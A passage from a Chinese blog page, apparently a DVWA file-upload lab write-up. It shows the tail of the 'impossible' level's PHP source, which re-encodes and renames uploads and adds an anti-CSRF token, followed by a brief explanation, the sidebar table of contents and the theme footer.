class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>可以看到这次impossible中加入了ANTICSRF以及对文件进行了重命名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure>
+<p> 从根本上杜绝了文件上传的漏洞。</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UPLOAD"><span class="nav-number">1.</span> <span class="nav-text">UPLOAD</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#low"><span class="nav-number">1.1.</span> <span class="nav-text">low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#medium"><span class="nav-number">1.2.</span> <span class="nav-text">medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#high"><span class="nav-number">1.3.</span> <span class="nav-text">high</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#impossible"><span class="nav-number">1.4.</span> <span class="nav-text">impossible</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ziyuexi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ziyuexi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
